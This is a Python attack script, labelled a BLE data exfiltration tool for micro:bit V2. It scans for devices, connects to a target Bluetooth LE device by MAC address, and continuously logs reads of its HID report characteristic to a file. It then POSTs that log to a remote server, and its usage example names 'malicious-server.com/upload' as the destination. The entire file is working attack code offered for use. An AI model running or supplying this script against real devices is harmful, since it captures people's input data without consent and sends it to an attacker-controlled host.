# microbit_ble_exfiltration.py

"""
BLE Data Exfiltration Attack for micro:bit V2 (Multi-Device Support)

This script captures BLE data and exfiltrates it to a remote server.
- Detects available micro:bit devices and assigns tasks dynamically
- Captures BLE data packets (`--capture <target_mac> <log_file>`)
- Exfiltrates captured data to a remote server (`--exfiltrate <log_file> <server_url>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Capture BLE data packets:
   ```sh
   python microbit_ble_exfiltration.py --capture AA:BB:CC:DD:EE:FF captured_data.txt
   ```

2. Exfiltrate captured data to a remote server:
   ```sh
   python microbit_ble_exfiltration.py --exfiltrate captured_data.txt http://malicious-server.com/upload
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
import datetime
import requests
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Data Capture
async def ble_capture(target_mac, log_file):
    """Captures BLE data from a target device."""
    print(f"[+] Capturing BLE data from {target_mac}...")
    async with BleakClient(target_mac) as client:
        with open(log_file, "w") as f:
            while True:
                try:
                    data = await client.read_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb")
                    timestamp = datetime.datetime.now().isoformat()
                    f.write(f"{timestamp} | {target_mac} | {data.hex()}\n")
                    print(f"[+] Captured Data: {data.hex()}")
                except Exception as e:
                    print(f"[-] Error capturing data: {e}")
                await asyncio.sleep(0.1)

# Data Exfiltration
def exfiltrate_log(log_file, server_url):
    """Sends logged BLE data to a remote server."""
    print(f"[+] Exfiltrating captured data from {log_file} to {server_url}...")
    try:
        with open(log_file, "r") as f:
            data = f.read()
        response = requests.post(server_url, data={"ble_data": data})
        print(f"[+] Exfiltration response: {response.text}")
    except Exception as e:
        print(f"[-] Exfiltration failed: {e}")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Data Exfiltration Attack for micro:bit V2")
    parser.add_argument("--capture", nargs=2, metavar=("target_mac", "log_file"), help="Capture BLE data packets")
    parser.add_argument("--exfiltrate", nargs=2, metavar=("log_file", "server_url"), help="Exfiltrate captured BLE data to a remote server")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.capture:
        loop.run_until_complete(ble_capture(args.capture[0], args.capture[1]))
    elif args.exfiltrate:
        exfiltrate_log(args.exfiltrate[0], args.exfiltrate[1])
